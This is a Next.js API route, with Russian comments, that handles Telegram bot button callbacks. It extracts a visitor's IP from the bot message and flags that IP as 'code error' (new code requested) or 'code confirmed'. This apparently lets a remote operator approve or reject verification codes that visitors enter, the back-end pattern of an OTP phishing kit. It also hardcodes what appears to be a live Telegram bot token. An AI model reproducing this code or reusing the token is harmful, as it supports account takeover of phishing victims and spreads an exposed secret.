import { NextRequest, NextResponse } from 'next/server';
import { setCodeErrorFlag, setCodeSuccessFlag, clearCodeFlags } from '../codeErrorStore';

const TELEGRAM_TOKEN = '7962685508:AAHBZMDWD4hqHYVzjjDfv4pjMAZ6aMwAvTc';

export async function POST(req: NextRequest) {
  try {
    console.log('Callback endpoint hit');
    const body = await req.json();
    console.log('Callback received body:', JSON.stringify(body, null, 2));

    if (!body.callback_query) {
      console.log('No callback_query in body');
      return NextResponse.json({ ok: false, error: 'No callback_query' }, { status: 400 });
    }

    // Получаем IP из сообщения
    const messageText = body.callback_query.message.text;
    console.log('Message text:', messageText);
    
    // Изменяем регулярку для более точного поиска IP
    const ipMatch = messageText.match(/🌍 <b>IP:<\/b> ([^\n]+)/);
    if (!ipMatch) {
      console.error('Could not extract IP from message');
      return NextResponse.json({ ok: false, error: 'Could not extract IP' }, { status: 400 });
    }

    const ip = ipMatch[1].trim();
    console.log('Extracted IP:', ip);
    console.log('Callback data:', body.callback_query.data);

    // Сначала очищаем все флаги для этого IP
    clearCodeFlags(ip);

    // Затем устанавливаем соответствующий флаг
    if (body.callback_query.data === 'code_error') {
      console.log('Processing code_error callback');
      setCodeErrorFlag(ip, true);
      console.log('Set code error flag for IP:', ip);
    } else if (body.callback_query.data === 'code_success') {
      console.log('Processing code_success callback');
      setCodeSuccessFlag(ip, true);
      console.log('Set code success flag for IP:', ip);
    } else {
      console.log('Unknown callback data:', body.callback_query.data);
      return NextResponse.json({ ok: false, error: 'Unknown callback data' }, { status: 400 });
    }

    // Отправляем ответ в Telegram
    const answerUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
    const response = await fetch(answerUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: body.callback_query.id,
        text: body.callback_query.data === 'code_error' ? 'Запрошен новый код' : 'Код подтвержден'
      })
    });

    const responseData = await response.json();
    console.log('Telegram answer response:', responseData);

    if (!response.ok) {
      console.error('Failed to send answer to Telegram:', responseData);
      return NextResponse.json({ ok: false, error: 'Failed to send answer to Telegram' }, { status: 500 });
    }
    
    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error('Error processing callback:', error);
    return NextResponse.json({ ok: false, error: 'Internal server error' }, { status: 500 });
  }
} 